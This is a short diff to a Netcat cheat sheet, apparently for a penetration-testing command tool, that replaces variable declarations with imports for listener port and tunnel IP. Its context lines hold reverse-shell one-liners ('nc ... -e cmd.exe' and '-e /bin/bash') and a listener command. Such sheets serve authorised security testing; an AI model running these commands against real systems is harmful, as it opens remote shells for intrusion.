@@ -10,7 +10,7 @@ Set up a Netcat listener for incoming shells or file transfers.
 nc -lvnp $lport
 ```
 <!-- cheat
-var lport
+import lports
 -->
 
 ### Windows bind shell
@@ -43,8 +43,8 @@ Connect a Windows shell back to your listener.
 nc -nv $lhost $lport -e cmd.exe
 ```
 <!-- cheat
-var lhost
-var lport
+import lports
+import tun_ip
 -->
 
 ### Linux reverse shell
@@ -55,8 +55,8 @@ Connect a Linux shell back to your listener.
 nc -nv $lhost $lport -e /bin/bash
 ```
 <!-- cheat
-var lhost
-var lport
+import lports
+import tun_ip
 -->
 
 ### Download file via nc
